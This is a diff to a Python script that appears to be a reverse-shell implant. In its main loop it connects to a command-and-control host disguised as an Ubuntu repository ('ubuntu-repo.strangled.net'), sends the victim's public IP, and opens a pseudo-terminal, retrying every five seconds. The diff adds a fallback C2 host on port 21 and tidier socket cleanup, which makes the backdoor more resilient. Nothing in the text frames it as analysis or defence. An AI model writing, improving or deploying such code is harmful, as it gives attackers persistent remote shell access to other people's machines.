@@ -49,11 +49,17 @@ def main():
         pass
 
     while True:
+        s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("ubuntu-repo.strangled.net", 8090))
             
-            # Instantly pass the public IP string to the C2 server
+            try:
+                s.connect(("ubuntu-repo.strangled.net", 8090))
+            except Exception:
+                s.close()
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect(("linux-x86-tcpudp.strangled.net", 21))
+            
             s.send(f"{true_ip}\n".encode())
             
             master, slave = os.openpty()
@@ -96,10 +102,11 @@ def main():
         except Exception:
             pass
         finally:
-            try:
-                s.close()
-            except:
-                pass
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
             
         time.sleep(5)
 
